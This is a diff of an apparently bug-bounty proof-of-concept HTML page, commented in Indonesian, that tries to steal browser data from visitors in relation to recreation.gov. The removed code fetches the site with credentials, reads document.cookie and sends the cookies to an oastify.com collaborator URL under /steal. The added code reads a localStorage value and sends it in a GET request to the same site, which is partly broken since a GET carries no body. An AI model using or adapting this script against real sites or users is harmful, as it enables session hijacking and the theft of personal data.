@@ -6,24 +6,26 @@
 <body>
     <h1>POC - Ambil Cookie dengan CORS</h1>
     <script>
-        fetch('https://www.recreation.gov', {
-            credentials: 'include'
-        })
-        .then(response => {
-            if (response.ok) {
-                // Setelah permintaan selesai, ambil cookie
-                var cookies = document.cookie; // Mengambil semua cookie
-                console.log("Cookie yang tersedia:", cookies);
+        // Mengambil data dari local storage
+var localStorageData = localStorage.getItem('kampyleUserPercentile'); // Ganti 'namaKunci' dengan kunci yang sesuai
 
-                // Kirim cookie ke server penyerang
-                var xhr = new XMLHttpRequest();
-                xhr.open("GET", "https://569mgtujeb7m4nztnsxzf9te157wvmjb.oastify.com/steal?cookies=" + encodeURIComponent(cookies), true);
-                xhr.send();
-            } else {
-                console.log("Permintaan tidak berhasil:", response.status);
-            }
-        })
-        .catch(error => console.log("Gagal mengambil link:", error));
+// Mengirim data menggunakan XMLHttpRequest
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "https://www.recreation.gov/", true); // Ganti dengan URL server yang sesuai
+xhr.setRequestHeader("Content-Type", "text/plain"); // Mengatur header
+
+// Mengatur fungsi yang akan dijalankan ketika permintaan selesai
+xhr.onload = function() {
+    if (xhr.status === 200) {
+        console.log('Data berhasil dikirim:', localStorageData);
+    } else {
+        console.error('Gagal mengirim data:', xhr.statusText);
+    }
+};
+
+// Mengirim data
+xhr.send(localStorageData);
+
     </script>
 </body>
 </html>
